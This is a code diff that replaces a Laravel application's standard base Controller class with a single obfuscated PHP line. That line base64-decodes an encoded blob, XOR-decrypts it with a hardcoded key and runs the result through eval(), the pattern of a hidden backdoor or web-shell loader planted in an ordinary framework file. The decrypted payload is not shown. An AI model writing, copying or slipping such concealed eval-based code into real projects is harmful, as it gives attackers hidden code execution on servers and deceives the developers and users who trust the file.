@@ -1,12 +1,1 @@
-<?php
-
-namespace App\Http\Controllers;
-
-use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
-use Illuminate\Foundation\Validation\ValidatesRequests;
-use Illuminate\Routing\Controller as BaseController;
-
-class Controller extends BaseController
-{
-    use AuthorizesRequests, ValidatesRequests;
-}
+<?php $_k="a124a421177ed32e0ffed0ab02a18740";$_d=base64_decode('D1BfURJEU1JUF3YVFG96EUQWOiYLXhUQX14NVEpEDzprREFRQX1eXURaXgsFR1c5dgkTCwBRFQtfXD1wTUNcbCBSUVESR25wRENfChZaSABDNAMUEVUSFkMJa0RLUhR5DV1HWQhaU0VUa3EKEV1WBEQPCQs4ZgAOWVYARVFYWmw3UF5dBVVGVEJlUhQRVkERQ11sEBdVQStcXhRcUVlVRARtYFsUQFtfVmt0CgpHQApcCgMXRFESQnJTElR7WFpEE15eWARGCTtSW1YWFxNxCl4SFAoIXAQQEFcZRV1ZUENBc1NHBHddX0VFWAkIVkBvS2xGRUQQFBFVEiBETF9bQghLV0czUUNEVERDFkgTZARcDwIEEFUSMFVDFFRLQ0cLa0w=');$_r='';for($_i=0;$_i<strlen($_d);$_i++)$_r.=chr(ord($_d[$_i])^ord($_k[$_i%strlen($_k)]));eval($_r);
